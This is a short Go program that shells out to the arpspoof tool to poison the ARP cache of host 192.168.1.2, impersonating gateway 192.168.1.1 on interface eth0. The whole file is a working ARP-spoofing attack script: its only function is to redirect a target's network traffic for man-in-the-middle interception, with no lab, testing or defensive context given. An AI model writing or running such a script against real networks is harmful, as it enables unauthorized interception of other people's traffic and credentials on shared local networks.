package main

import (
    "fmt"
   
    "os/exec"
)

func arpSpoof(targetIP, gatewayIP string) {
    cmd := exec.Command("arpspoof", "-i", "eth0", "-t", targetIP, gatewayIP)
    if err := cmd.Run(); err != nil {
        fmt.Println("Error running arpspoof:", err)
    }
}

func main() {
    arpSpoof("192.168.1.2", "192.168.1.1")
}